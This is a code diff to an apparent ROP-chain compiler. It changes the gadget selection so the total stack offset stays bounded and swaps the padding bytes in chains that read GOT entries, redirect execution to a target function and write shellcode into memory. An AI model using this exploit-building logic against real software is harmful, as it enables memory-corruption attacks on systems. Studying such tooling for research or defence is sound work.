@@ -279,8 +279,13 @@ class Scheduler(object):
           arg_gadgets.append(arg_gadget)
         no_clobber.append(reg)
 
-      if len(arg_gadgets) == len(arguments):
+      if len(arg_gadgets) == len(arguments) and (
+          read_gadget.stack_offset + set_read_addr_gadget.stack_offset + jump_gadget.stack_offset +
+          add_jump_reg_gadget.stack_offset + set_add_reg_gadget.stack_offset +
+          sum([x.stack_offset for x in arg_gadgets])
+        ) < 0x1000:
         break
+      arg_gadgets = []
 
     # Couldn't find all the necessary gadgets
     if len(arg_gadgets) != len(arguments):
@@ -299,18 +304,18 @@ class Scheduler(object):
     chain = self.create_set_reg_chain(set_read_addr_gadget, address - read_gadget.params[0], read_gadget.address)
 
     # read the address in the GOT
-    read_gadget_chain = read_gadget.ip_in_stack_offset * "B"
+    read_gadget_chain = read_gadget.ip_in_stack_offset * "D"
     read_gadget_chain += self.ap(set_add_reg_gadget.address)
-    read_gadget_chain += (read_gadget.stack_offset - len(read_gadget_chain)) * "C"
+    read_gadget_chain += (read_gadget.stack_offset - len(read_gadget_chain)) * "E"
     chain += read_gadget_chain
 
     # set the offset from the base to the target
     chain += self.create_set_reg_chain(set_add_reg_gadget, offset, add_jump_reg_gadget.address)
 
     # add the offset
-    add_jump_reg_gadget_chain = add_jump_reg_gadget.ip_in_stack_offset * "B"
+    add_jump_reg_gadget_chain = add_jump_reg_gadget.ip_in_stack_offset * "F"
     add_jump_reg_gadget_chain += self.ap(start_of_function_address)
-    add_jump_reg_gadget_chain += (add_jump_reg_gadget.stack_offset - len(add_jump_reg_gadget_chain)) * "C"
+    add_jump_reg_gadget_chain += (add_jump_reg_gadget.stack_offset - len(add_jump_reg_gadget_chain)) * "G"
     chain += add_jump_reg_gadget_chain
 
     # Set the arguments for the function
@@ -321,7 +326,7 @@ class Scheduler(object):
       chain += self.create_set_reg_chain(arg_gadgets[i], arguments[i], next_address)
 
     # Finally, jump to the function
-    chain += jump_gadget.stack_offset * "C"
+    chain += jump_gadget.stack_offset * "H"
     chain += self.ap(end_address)
 
     return (chain, set_read_addr_gadget.address)
@@ -381,9 +386,9 @@ class Scheduler(object):
     chain += self.create_set_reg_chain(load_value_gadget, buf, store_mem_gadget.address)
 
     # Finally, create the chain to write to memory
-    set_mem_rop = store_mem_gadget.ip_in_stack_offset * "B"
+    set_mem_rop = store_mem_gadget.ip_in_stack_offset * "I"
     set_mem_rop += self.ap(next_address)
-    set_mem_rop += (store_mem_gadget.stack_offset - len(set_mem_rop)) * "C"
+    set_mem_rop += (store_mem_gadget.stack_offset - len(set_mem_rop)) * "J"
     chain += set_mem_rop
 
     return (chain, load_addr_gadget.address)
@@ -391,7 +396,7 @@ class Scheduler(object):
   def create_write_shellcode_chain(self, shellcode, address, next_address):
     """This function returns a ROP chain implemented to write shellcode to a given address"""
     if len(shellcode) % 8 != 0:
-      shellcode += (8 - (len(shellcode) % 8)) * "E" # pad it to be 8 byte aligned (for simplicity)
+      shellcode += (8 - (len(shellcode) % 8)) * "K" # pad it to be 8 byte aligned (for simplicity)
 
     chain = ""
     addr = address
